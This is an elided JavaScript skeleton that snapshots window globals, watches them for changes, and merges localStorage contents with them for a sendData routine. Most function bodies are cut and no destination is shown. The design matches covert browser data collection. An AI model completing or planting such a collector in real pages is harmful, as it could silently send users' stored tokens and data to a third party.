...
(function () {
  ...
  function generateUniqueID(inputData) {
    let concatenatedKeys = Object.keys(inputData).join("");
    let uniqueId = 0;
    for (let i = 0; i < concatenatedKeys.length; i++) {
      uniqueId = (uniqueId << 5) - uniqueId + concatenatedKeys.charCodeAt(i);
      uniqueId &= uniqueId;
    }
  ...
  function hookGlobalVariables() {
    ...
    for (let variable in window) {
      if (window.hasOwnProperty(variable) && !variable.startsWith('webkit')) {
  ...
  function catchJsHook() {
    Object.keys(globalVariables).forEach(key => {
      if (window[key] !== globalVariables[key]) {
        console.log("Global variable changed: ", key);
      }
    });
  }
  function $r(a, b, c) {
  ...
  function sendData(payload) {
    const uniqueId = generateUniqueID(payload);
  ...
  function gatherAndSendData() {
    ...
    const collectedData = Object.assign({}, localStorageData, globalVariables);
